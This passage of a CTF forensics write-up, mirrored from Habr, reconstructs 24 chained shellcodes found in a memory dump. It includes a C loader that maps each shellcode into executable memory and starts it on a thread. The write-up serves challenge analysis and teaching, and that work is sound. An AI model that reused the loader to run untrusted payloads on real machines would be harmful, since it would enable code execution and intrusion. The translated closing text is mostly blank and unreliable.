SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table"><table><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td> ?? </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td> ?? </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td> ?? </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td> ?? </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td> ?? </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p> Program executed and flag showed up in memory after XOR operation. </p><br><p> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p>  sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="></a> . </p><br><h2> 一些统计 </h2><br><p>                .   136     . </p><br><p>       . <br>       — ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p>     Protected Shell  RuCTFE.       — 10.   vos,     1 26. </p><br><p> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN472416/">https://habr.com/ru/post/zh-CN472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN472404/index.html">二维碰撞计算：Gilbert-Johnson-Kirti算法</a></li>
<li><a href="../zh-CN472406/index.html">披萨送货期间扩展数据中心</a></li>
<li><a href="../zh-CN472410/index.html">设计可用的色彩系统</a></li>
<li><a href="../zh-CN472412/index.html">系统分析师和产品指标-摇动但不能混为一谈？</a></li>
<li><a href="../zh-CN472414/index.html">快速中子反应堆的悠久历史和封闭燃料循环的希望</a></li>
<li><a href="../zh-CN472418/index.html">如何保留自定义开发的权利</a></li>
<li><a href="../zh-CN472420/index.html">由于推迟了Promise，使界面更具响应性</a></li>
<li><a href="../zh-CN472422/index.html">Sber X RamblerFront和聚会</a></li>
<li><a href="../zh-CN472426/index.html">安全周刊43：物联网Hanipot的秘密生活</a></li>
<li><a href="../zh-CN472428/index.html">Tarantool Kubernetes运算符</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>